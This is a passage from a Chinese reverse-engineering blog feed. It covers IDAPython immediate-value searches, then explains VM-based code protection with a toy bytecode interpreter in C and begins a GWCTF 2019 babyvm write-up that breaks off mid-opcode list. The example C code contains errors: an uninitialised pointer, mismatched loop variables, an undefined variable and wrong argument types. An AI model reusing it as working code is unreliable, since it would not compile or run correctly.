确定为代码和数据。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-number">0x41b900</span> db ? ;<br>Python&gt; addr = idc.FindExplored(ea, SEARCH_UP)<br>Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(addr), idc.GetDisasm(addr))<br><span class="hljs-number">0x41b5f4</span> dd ?<br></code></pre></td></tr></table></figure><p>这可能看上去不是真实的值，但如果我们要打印的<code>addr</code>的交叉引用，我们会看到它被使用</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">Python&gt; <span class="hljs-keyword">for</span> xref <span class="hljs-keyword">in</span> idautils.XrefsTo(addr, <span class="hljs-number">1</span>):<br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(xref.frm), idc.GetDisasm(xref.frm))<br>Python&gt;<br><span class="hljs-number">0x4069c3</span> mov eax, dword_41B5F4[ecx*<span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure><h3 id="idc-FindImmediate-ea-flag-value">idc.FindImmediate(ea, flag, value)</h3><p>并不是寻找一种我们可能要搜索的一个特定的值。比方说，我们猜测代码调用<code>rand</code>来生成一个随机数，但是我们找不到代码。如果我们知道<code>rand</code>使用值<code>0x343fd</code>作为种子，则我们可以寻找一些数。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">Python&gt; addr = idc.FindImmediate(MinEA(), SEARCH_DOWN, <span class="hljs-number">0x343FD</span> )<br>Python&gt; addr<br>[<span class="hljs-number">268453092</span>, <span class="hljs-number">0</span>]<br>Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;0x%x %s %x&quot;</span> % (addr[<span class="hljs-number">0</span>], idc.GetDisasm(addr[<span class="hljs-number">0</span>]), addr[<span class="hljs-number">1</span>]))<br><span class="hljs-number">0x100044e4</span> imul eax, 343FDh <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>在第一行我们获取最小地址通过<code>MinEA()</code>，接下来，然后搜索值<code>0x343fd</code>。而不是返回一个地址来显示找到的APIs <code>idc.FindImmediate</code>返回一个<code>tupple</code>。<code>tupple</code>的第一项将成为地址第二项将成为操作数。类似于<code>idc.GetOpnd</code>第一个操作数开始返回零。当我们打印的地址和反汇编，我们可以看到的值是第二个操作数。如果我们想搜索所有使用立即数我们可以做如下内容。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py">Python&gt;addr = MinEA()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br><span class="hljs-meta">... </span>addr, operand = idc.FindImmediate(addr, SEARCH_DOWN|SEARCH_NEXT, <span class="hljs-number">0x7a</span>)<br><span class="hljs-meta">... </span><span class="hljs-keyword">if</span> addr != BADADDR:<br>    ... <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(addr), idc.GetDisasm(addr), <span class="hljs-string">&quot;Operand &quot;</span>, operand)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-meta">... </span><span class="hljs-keyword">break</span><br>Python&gt;<br><span class="hljs-number">0x402434</span> dd <span class="hljs-number">9</span>, 0FF0Bh, 0Ch, 0FF0Dh, 0Dh, 0FF13h, 13h, 0FF1Bh, 1Bh Operand <span class="hljs-number">0</span><br><span class="hljs-number">0x40acee</span> cmp eax, 7Ah Operand <span class="hljs-number">1</span><br><span class="hljs-number">0x40b943</span> push 7Ah Operand <span class="hljs-number">0</span><br><span class="hljs-number">0x424a91</span> cmp eax, 7Ah Operand <span class="hljs-number">1</span><br><span class="hljs-number">0x424b3d</span> cmp eax, 7Ah Operand <span class="hljs-number">1</span><br><span class="hljs-number">0x425507</span> cmp eax, 7Ah Operand <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>大部分的代码应该看起来很熟悉，但因为我们是搜索多个值我们将使用一个<code>while</code>循环和<code>SEARCH_DOWN|SEARCH_NEXT</code>标志。</p>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>VM：虚拟机保护技术</title>
    <link href="/2022/07/04/VM%EF%BC%9A%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/"/>
    <url>/2022/07/04/VM%EF%BC%9A%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p><code>VM</code>逆向对于<code>Re</code>老手肯定是不陌生的，但是对于我一个<code>Re</code>废物来说，之前一直有听说过<code>VM</code>的逆向题目，但是因为时间原因一直没有去实践过一个题目，基本上是遇到就溜，感觉到十分棘手，因此在此次学习中将其进行记录，也希望对后来学习的同学有所帮助</p><h2 id="基本介绍">基本介绍</h2><p><code>VMP</code>：也就是虚拟机保护技术，它是将基于x86汇编系统的可执行代码转换为字节码指令系统的代码，以达到保护原有指令不被轻易逆向和篡改的目的。这种指令执行系统和Intel的x86指令系统不在同一个层次中。</p><p>字节码(<code>Bytecode</code>)：是由指令执行系统定义的一套指令和数据组成的一串数据流，由于每个系统设计的字节码都是供自己使用的，因此他们之间的字节码并不通用。</p><p>虚拟机执行时的情况：</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190118103002-f5bb62b4-1ac8-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190118103002-f5bb62b4-1ac8-1.png" alt="img"></a></p><p><code>VStartVM</code>将真实环境压入栈后会生成一个<code>VMDispather</code>标签，当<code>Handler</code>执行完毕后会跳回这里，形成一个循环，所以<code>VStratVM</code>，也叫做<code>dispather</code></p><h2 id="做题思路">做题思路</h2><p>分析<code>VM</code>基本上是一个体力活，需要将程序的<code>opcode</code>提取出来进行翻译为高级的语言，之后再采用逆向的方式对其进行求解</p><p>分析VM题的一般套路：</p><ol><li>提取出bytecode</li><li>根据op代入函数</li><li>转化成伪汇编代码</li><li>转化成高级语言代码(C/C++/Python)</li><li>逆向算法，写出解密脚本</li></ol><h2 id="VM小型虚拟机的实现">VM小型虚拟机的实现</h2><p>要想实现一个简单的虚拟机我们需要完成两个小目标</p><ol><li>定义一套<code>opcode</code></li><li>实现一个<code>opcode</code>的解释器</li></ol><h3 id="初始化虚拟寄存器、opcode存放">初始化虚拟寄存器、opcode存放</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">typedef struct<br>&#123;<br>    unsigned long r1;    <span class="hljs-comment">//虚拟寄存器r1</span><br>    unsigned long r2;    <span class="hljs-comment">//虚拟寄存器r2</span><br>    unsigned long r3;    <span class="hljs-comment">//虚拟寄存器r3</span><br>    unsigned char *eip;    <span class="hljs-comment">//指向正在解释的opcode地址</span><br>    vm_opcode op_list[OPCODE_N];    <span class="hljs-comment">//opcode列表，存放了所有的opcode及其对应的处理函数</span><br>&#125;vm_cpu;<br></code></pre></td></tr></table></figure><p><code>r1-r3</code>用来传参或者是存放返回值,<code>eip</code>指向<code>opcode</code>的地址</p><h3 id="定义opcode">定义opcode</h3><p>opcode只是一个标识，可以随便定义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">typedef struct<br>&#123;<br>    unsigned char opcode;<br>    <span class="hljs-keyword">void</span> (*handle)(<span class="hljs-keyword">void</span>*);<br>&#125;vm_opcode;<br></code></pre></td></tr></table></figure><h3 id="关联opcode和对应handler函数">关联opcode和对应handler函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">vm_init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    vm_vpu *cpu;<br>    cpu-&gt;r1 = <span class="hljs-number">0</span>;<br>    cpu-&gt;r2 = <span class="hljs-number">0</span>;<br>    cpu-&gt;r3 = <span class="hljs-number">0</span>;<br>    cpu-&gt;eip = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)vm_code;<span class="hljs-comment">//将eip指向opcode的地址</span><br><br>    cpu-&gt;op_list[<span class="hljs-number">0</span>].opcode = <span class="hljs-number">0xf1</span>;<br>    cpu-&gt;op_list[<span class="hljs-number">0</span>].handle = (<span class="hljs-keyword">void</span> (*)(<span class="hljs-keyword">void</span> *))mov;<span class="hljs-comment">//将操作字节码与对应的handle函数关联在一起</span><br><br>    cpu-&gt;op_list[<span class="hljs-number">1</span>].opcode = <span class="hljs-number">0xf2</span>;<br>    cpu-&gt;op_list[<span class="hljs-number">1</span>].handle = (<span class="hljs-keyword">void</span> (*)(<span class="hljs-keyword">void</span> *))<span class="hljs-keyword">xor</span>;<br><br>    cpu-&gt;op_list[<span class="hljs-number">2</span>].opcode = <span class="hljs-number">0xf5</span>;<br>    cpu-&gt;op_list[<span class="hljs-number">2</span>].handle = (<span class="hljs-keyword">void</span> (*)(<span class="hljs-keyword">void</span> *))read_;<br><br>    vm_stack = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x512</span>);<br>    <span class="hljs-built_in">memset</span>(vm_stack,<span class="hljs-number">0</span>,<span class="hljs-number">0x512</span>);<span class="hljs-comment">//定义了一个新栈并在malloc上申请了0x512位的空间</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="虚拟机入口函数">虚拟机入口函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vm_start</span><span class="hljs-params">(vm_cpu *cpu)</span></span><br><span class="hljs-function"></span>&#123;<br>    cpu-&gt;eip = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*)opcodes;<span class="hljs-comment">//eip指向要被解释的opcode地址</span><br>    <span class="hljs-keyword">while</span>((*cpu-&gt;eip) != <span class="hljs-number">0xf4</span>)<span class="hljs-comment">//如果opcode不为RET，就调用vm_dispatcher来解释执行</span><br>    &#123;<br>        vm_dispatcher(*cpu-&gt;eip)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="解释执行器编写">解释执行器编写</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vm_dispatcher</span><span class="hljs-params">(vm_cpu *cpu)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> j;<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;OPCODE_N;j++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(*cpu-&gt;eip ==cpu-&gt;op_list[i].opcode)<br>        &#123;<br>            cpu-&gt;op_list[i].handle(cpu);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="具体执行函数实现">具体执行函数实现</h3><p>这里实现<code>mov xor read</code>三个简单的指令 其中<code>read</code>指令用于读取数据 在题目中用于读取<code>flag</code>。具体题目中根据题目要求实现不同的函数功能即可。所以说虚拟机类<code>re</code>题目很好的考察了参赛选手的代码能力</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">xor</span><span class="hljs-params">(vm_cpu *cpu)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> num;<br>    num =cpu-&gt;r1 ^cpu-&gt;r2;<br>    num ^=<span class="hljs-number">0x12</span>;<br>    cpu-&gt;r1= temp;<br>    cpu-&gt;eip=eip+<span class="hljs-number">1</span>;<span class="hljs-comment">//这里一定要注意xor指令本身是占一个字节的。</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mov</span><span class="hljs-params">(vm_cpu *cpu)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/*mov指令的参数都隐藏在字节码中，指令表示后的一个字节是寄存器标识，第二到第五是要mov的数据在vm_stack上的偏移。这里只实现了从vm_stack栈上存取数据*/</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *res =cpu-&gt;eip+<span class="hljs-number">1</span>;<span class="hljs-comment">//寄存器标识</span><br>    <span class="hljs-keyword">int</span> *offset = (<span class="hljs-keyword">int</span> *)(cpu-&gt;eip+<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">char</span> *dest=<span class="hljs-number">0</span>;<br>    dest=vm_stack;<br>    <span class="hljs-keyword">switch</span>(*res)&#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xe1</span>:<br>        cpu-&gt;r1=*(dest + *offset);<br>        <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xe2</span>:<br>        cpu-&gt;r2=*(dest + *offset);<br>        <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xe3</span>:<br>        cpu-&gt;r3=*(dest + *offset);<br>        <span class="hljs-keyword">break</span>;<span class="hljs-comment">//数据寄存</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xe4</span>:<br>            &#123;<br>                <span class="hljs-keyword">int</span> x=cpu-&gt;r1;<br>                *(dest + *offset)=x;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<span class="hljs-comment">//获取寄存器中数据</span><br>    &#125;<br>    cpu-&gt;eip += <span class="hljs-number">6</span>;<span class="hljs-comment">//mov指令占六个字节，所以eip要向后移6位</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="定义opcode字符集">定义opcode字符集</h3><p>定义opcode字符集，每个字符对应一个函数功能模块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> vm_code[] = &#123;<br>    <span class="hljs-number">0xf5</span>,<br>    <span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe1</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xf2</span>,<span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe1</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xf2</span>,<span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe1</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xf2</span>,<span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe1</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xf2</span>,<span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe1</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xf2</span>,<span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe1</span>,<span class="hljs-number">0x5</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xf2</span>,<span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe1</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xf2</span>,<span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe1</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xf2</span>,<span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe1</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xf2</span>,<span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe1</span>,<span class="hljs-number">0x9</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xf2</span>,<span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x29</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe1</span>,<span class="hljs-number">0xa</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xf2</span>,<span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe1</span>,<span class="hljs-number">0xb</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xf2</span>,<span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x2b</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe1</span>,<span class="hljs-number">0xc</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xf2</span>,<span class="hljs-number">0xf1</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0xf4</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>至此，一个简化版的小型虚拟机就实现完了。该虚拟机实现了对输入字符串简单的异或加密，并将加密后的值存储到指定位置。</p><p>用<code>gcc</code>编译一下就可以在<code>IDA</code>上自己逆着玩（没想到意外的学会了<code>VMRE</code>怎么出题）</p><p>下面以一个<code>VM</code>逆向来进一步说明</p><h2 id="GWCTF-2019-babyvm">[GWCTF 2019] babyvm</h2><p>我们首先将程序查壳，发现是无壳<code>64</code>位程序，直接拖入到<code>64</code>位<code>IDA</code>中去</p><p>找到对应的主函数，可以发现函数十分少(下面图片中函数名都是后期修复的，前期需要自己进行识别修复)</p><p><img src="https://s2.loli.net/2022/07/04/3G5bqSUAHE6sJ1g.png" alt="1.png"></p><p>我们主要分析的便是<code>VM_init</code>，进入该函数部分</p><p><img src="https://s2.loli.net/2022/07/04/HxuQ6T7gUcvoKpB.png" alt="2.png"></p><p>可以看到这个程序对应的初始化过程和上文所写的<a href="##%E5%85%B3%E8%81%94opcode%E5%92%8C%E5%AF%B9%E5%BA%94handler%E5%87%BD%E6%95%B0">关联opcode和对应handler函数过程</a>十分相似，可以快速的帮我们进行识别出来<code>eip</code></p><blockquote><p>图片上标注错了，64位的程序对应寄存器该是<code>rip</code>，但是不影响分析，后文仍然采用<code>eip</code>代替<code>rip</code>，方便进行描述</p></blockquote><p>程序中明显的看到取地址符<code>&amp;</code>，点进去便可以发现一大串的<code>opcode</code>，我们先将其进行提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode = [<span class="hljs-number">0xF5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x00</span>, <span 